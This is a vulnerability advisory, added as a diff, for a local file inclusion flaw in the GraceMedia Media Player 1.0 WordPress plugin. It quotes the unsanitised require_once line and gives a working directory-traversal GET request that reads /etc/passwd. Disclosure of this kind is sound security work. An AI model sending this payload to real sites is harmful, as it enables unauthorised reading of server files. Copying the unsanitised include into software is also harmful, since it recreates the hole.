@@ -1,0 +1,88 @@
+=============================================
+MGC ALERT 2019-001
+- Original release date: February 06, 2019
+- Last revised:  March 13, 2019
+- Discovered by: Manuel García Cárdenas
+- Severity: 7/10 (CVSS Base Score)
+- CVE-ID: CVE-2019-9618
+=============================================
+
+I. VULNERABILITY
+-------------------------
+WordPress Plugin GraceMedia Media Player 1.0 - Local File Inclusion
+
+II. BACKGROUND
+-------------------------
+Hassle-free and user-friendly way to add a Media player directly to your
+website.
+
+III. DESCRIPTION
+-------------------------
+This bug was found in the file:
+
+/gracemedia-media-player/templates/files/ajax_controller.php
+
+Vulnerable code:
+
+require_once($_GET['cfg']);
+
+The parameter "cfg" it is not sanitized allowing include local files
+
+To exploit the vulnerability only is needed use the version 1.0 of the HTTP
+protocol to interact with the application.
+
+IV. PROOF OF CONCEPT
+-------------------------
+The following URL have been confirmed that is vulnerable to local file
+inclusion.
+
+Local File Inclusion POC:
+
+GET
+/wordpress/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd
+
+V. BUSINESS IMPACT
+-------------------------
+Public defacement, confidential data leakage, and database server
+compromise can result from these attacks. Client systems can also be
+targeted, and complete compromise of these client systems is also possible.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+GraceMedia Media Player <= 1.0
+
+VII. SOLUTION
+-------------------------
+Disable plugin until a fix is available, vendor does not fix after 2
+requests.
+
+VIII. REFERENCES
+-------------------------
+https://es.wordpress.org/plugins/gracemedia-media-player/
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered and reported
+by Manuel García Cárdenas (advidsec (at) gmail (dot) com).
+
+X. REVISION HISTORY
+-------------------------
+February 06, 2019 1: Initial release
+March 13, 2019 2: Revision to send to lists
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+February 06, 2019 1: Vulnerability acquired by Manuel Garcia Cardenas
+February 06, 2019 2: Email to vendor without response
+February 21, 2019 3: Second email to vendor without response
+March 13, 2019 4: Send to the Full-Disclosure lists
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+
+XIII. ABOUT
+-------------------------
+Manuel Garcia Cardenas
+Pentester
